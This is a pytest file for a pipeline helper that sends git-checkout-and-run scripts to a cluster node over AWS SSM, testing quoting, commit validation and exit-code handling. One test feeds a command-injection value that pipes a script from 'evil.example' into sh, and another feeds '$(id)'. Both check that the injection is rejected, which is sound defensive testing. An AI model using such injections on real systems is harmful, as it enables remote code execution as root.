"""The pipeline's one way into the cluster: a script sent to the node over SSM."""
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "pipeline"))

import send_command as sc

SHA = "4385698" + "a" * 33


def test_the_command_puts_the_node_at_the_deployed_commit():
    text = sc.command_text(SHA, "deploy/pipeline/rollback.sh", ["prod"])
    assert f"git clone --quiet {sc.REPO} {sc.CHECKOUT}" in text
    assert f"git -C {sc.CHECKOUT} checkout --quiet --detach --force {SHA}" in text
    # A fresh node has no checkout, and a node from an earlier deploy has an
    # old one: clone guarded, then fetch, covers both.
    assert text.index("clone") < text.index("fetch") < text.index("checkout")


def test_the_script_runs_under_bash_with_quoted_arguments():
    """SSM runs its commands with sh, which on Ubuntu is dash."""
    text = sc.command_text(SHA, "deploy/pipeline/run-job.sh", ["staging", SHA, "deploy/k8s/gate-job.yaml", "gate"])
    assert text.rstrip().endswith(
        f"bash {sc.CHECKOUT}/deploy/pipeline/run-job.sh 'staging' '{SHA}' 'deploy/k8s/gate-job.yaml' 'gate'")


def test_a_script_with_no_arguments_has_no_trailing_space():
    assert sc.command_text(SHA, "deploy/pipeline/x.sh", []).endswith("/deploy/pipeline/x.sh")


def test_nothing_can_break_out_of_the_quoting():
    """Everything here runs as root on the node."""
    with pytest.raises(ValueError, match="quote"):
        sc.command_text(SHA, "deploy/pipeline/x.sh", ["staging'; curl evil.example | sh; '"])


def test_the_commit_has_to_be_a_commit():
    for bad in ("main", "HEAD", SHA[:7], SHA + "a", "$(id)", ""):
        with pytest.raises(ValueError, match="not a commit SHA"):
            sc.command_text(bad, "deploy/pipeline/x.sh", ["staging"])


def test_the_summary_keeps_stderr():
    status, code, out = sc.summarize({"Status": "Failed", "ResponseCode": 4,
                                      "StandardOutputContent": "gate ran\n",
                                      "StandardErrorContent": "timed out\n"})
    assert (status, code) == ("Failed", 4)
    assert "gate ran" in out and "--- stderr" in out and "timed out" in out


def test_the_summary_leaves_out_an_empty_stderr():
    _, _, out = sc.summarize({"Status": "Success", "ResponseCode": 0,
                              "StandardOutputContent": "ok\n", "StandardErrorContent": "  "})
    assert out == "ok\n"


@pytest.fixture
def fake_aws(monkeypatch):
    """Records the CLI calls and replays one send and one invocation."""
    calls = []
    state = {"invocation": {"Status": "Success", "ResponseCode": 0,
                            "StandardOutputContent": "done\n", "StandardErrorContent": ""}}

    def aws(*args):
        calls.append(args)
        if args[:2] == ("ec2", "describe-instances"):
            return ["i-0abc"]
        if args[:2] == ("ssm", "send-command"):
            return {"Command": {"CommandId": "cmd-1"}}
        if args[:2] == ("ssm", "get-command-invocation"):
            return state["invocation"]
        raise AssertionError(args)

    monkeypatch.setattr(sc, "aws", aws)
    monkeypatch.setattr(sc.time, "sleep", lambda _: None)
    return calls, state


def test_it_finds_the_node_by_tag_and_sends_the_script(fake_aws, capsys):
    calls, _ = fake_aws
    assert sc.run(SHA, "deploy/pipeline/deploy-namespace.sh", ["staging", SHA, "bucket"], 900) == 0
    lookup, send = calls[0], calls[1]
    assert f"Name=tag:Name,Values={sc.NODE_TAG}" in lookup
    assert "Name=instance-state-name,Values=running" in lookup
    assert "--document-name" in send and "AWS-RunShellScript" in send
    assert "'staging'" in send[send.index("--parameters") + 1]
    assert "done" in capsys.readouterr().out


def test_a_failing_script_fails_the_step(fake_aws):
    """The gate exits 1 on drift and 2 when it refuses to print; both must survive."""
    _, state = fake_aws
    for code in (1, 2, 4):
        state["invocation"] = {"Status": "Failed", "ResponseCode": code,
                               "StandardOutputContent": "", "StandardErrorContent": ""}
        assert sc.run(SHA, "deploy/pipeline/run-job.sh", ["staging"], 60, instance_id="i-0abc") == code


def test_a_failed_status_with_exit_zero_still_fails(fake_aws):
    """A cancelled or timed-out command reports no exit code of its own."""
    _, state = fake_aws
    state["invocation"] = {"Status": "TimedOut", "ResponseCode": 0,
                           "StandardOutputContent": "", "StandardErrorContent": ""}
    assert sc.run(SHA, "deploy/pipeline/run-job.sh", ["staging"], 60, instance_id="i-0abc") != 0


def test_the_output_can_be_kept_for_the_next_step(fake_aws, tmp_path):
    """The gate's numbers reach the deploy record through this file."""
    path = tmp_path / "gate.out"
    sc.run(SHA, "deploy/pipeline/run-gate.sh", ["staging"], 60,
           instance_id="i-0abc", output_file=str(path))
    assert path.read_text(encoding="utf-8") == "done\n"


def test_the_output_file_is_written_even_when_the_step_failed(fake_aws, tmp_path):
    _, state = fake_aws
    state["invocation"] = {"Status": "Failed", "ResponseCode": 1,
                           "StandardOutputContent": '{"hit_rate": 0.5}\n', "StandardErrorContent": ""}
    path = tmp_path / "gate.out"
    assert sc.run(SHA, "deploy/pipeline/run-gate.sh", ["staging"], 60,
                  instance_id="i-0abc", output_file=str(path)) == 1
    assert "hit_rate" in path.read_text(encoding="utf-8")


def test_one_node_or_nothing(monkeypatch):
    monkeypatch.setattr(sc, "aws", lambda *a: ["i-1", "i-2"])
    with pytest.raises(SystemExit, match="expected one running node"):
        sc.node_instance_id()


def test_main_passes_its_arguments_through(monkeypatch):
    seen = {}
    monkeypatch.setattr(sc, "run", lambda *a: seen.update(args=a) or 0)
    assert sc.main(["--sha", SHA, "--script", "deploy/pipeline/rollback.sh",
                    "--timeout", "120", "--instance-id", "i-9", "prod"]) == 0
    assert seen["args"] == (SHA, "deploy/pipeline/rollback.sh", ["prod"], 120, "i-9", None)
